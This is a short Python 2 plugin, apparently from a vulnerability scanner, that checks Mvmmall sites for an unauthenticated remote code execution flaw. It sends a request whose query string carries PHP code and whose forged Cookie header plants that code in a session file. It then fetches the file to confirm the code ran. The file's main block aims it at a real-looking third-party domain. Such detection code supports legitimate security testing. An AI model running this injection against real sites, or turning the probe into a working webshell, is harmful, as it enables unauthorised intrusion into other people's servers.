#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *

info = {
	'NAME':'Mvmmall unauthentication RCE',
	'AUTHOR':'wjk',
	'TIME':'20150325',
	'WEB':'',
	'DESCRIPTION':'mvmmall远程代码执行,http://www.wooyun.org/bugs/wooyun-2010-080042 '
}
opts = [
	['url','http://testasp.vulnweb.com','target url'],
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'mvmmall':
			return True
	return False

def Audit(services):
	url = services['url'] +"/index.php?<?print(md5(0x22))?>"
	data = {'Cookie': 'sessionID=1.php;PHPSESSIN=1.php;\r\n'}
	checkURL = services['url'] + "/union/data/session/mvm_sess_1.php"
	try:
		ul = requests.get(url,headers=data)	
		ul1= requests.get(checkURL)

		if 'e369853df766fa44e1ed0ff613f563bd' in ul1.text  :
			security_hole('mvmmall unauthentication remote code exec:' + checkURL)
			
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
